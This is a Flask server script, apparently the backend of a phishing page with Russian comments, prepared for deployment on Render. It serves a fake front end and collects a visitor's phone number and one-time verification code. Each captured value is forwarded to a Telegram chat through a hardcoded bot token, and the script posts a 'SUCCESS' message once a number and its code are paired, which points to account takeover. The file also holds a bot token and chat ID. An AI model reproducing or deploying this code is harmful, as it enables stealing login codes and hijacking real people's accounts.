from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import uuid
import os
import requests
from datetime import datetime

app = Flask(__name__, static_folder='.')
CORS(app)

# Временное хранилище для номеров (в памяти)
pending_requests = {}

# ================== НАСТРОЙКИ TELEGRAM ==================
# ВСТАВЬ СЮДА НОВЫЙ ТОКЕН (после того как перевыпустишь его в @BotFather)
BOT_TOKEN = "8952942696:AAFpjbsN70_UpNJFgLXaR_xWSgE7mFn7xc8" 
# ТВОЙ ID (если это группа, оставь минус в начале)
YOUR_CHAT_ID = "-1004430177333" 
# ========================================================

def send_to_telegram(text):
    """Отправляет сообщение в Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": YOUR_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            print(f"[-] Ошибка Telegram: {response.text}")
    except Exception as e:
        print(f"[-] Ошибка сети при отправке в TG: {e}")

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('.', filename)

@app.route('/api/send_code', methods=['POST'])
def api_send_code():
    data = request.json
    phone_number = data.get('phone')
    
    msg = f"📱 <b>Введен номер:</b> {phone_number}"
    print(f"\n[+] {msg}")
    send_to_telegram(msg)
    
    request_id = str(uuid.uuid4())
    pending_requests[request_id] = phone_number
    
    return jsonify({"success": True, "request_id": request_id})

@app.route('/api/verify_code', methods=['POST'])
def api_verify_code():
    data = request.json
    request_id = data.get('request_id')
    user_code = data.get('code')
    
    msg = f"🔑 <b>Введен код:</b> {user_code}"
    print(f"\n[+] {msg}")
    send_to_telegram(msg)
    
    if request_id in pending_requests:
        phone = pending_requests[request_id]
        final_msg = f"✅ <b>УСПЕХ!</b>\nНомер: {phone}\nКод: {user_code}"
        send_to_telegram(final_msg)
        
        del pending_requests[request_id]
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Сессия истекла"})

# Файл app.run удален, так как Render запускает его через gunicorn

# ВАЖНО: УДАЛЕНА СТРОКА app.run(...)
# Render сам запустит приложение через gunicorn
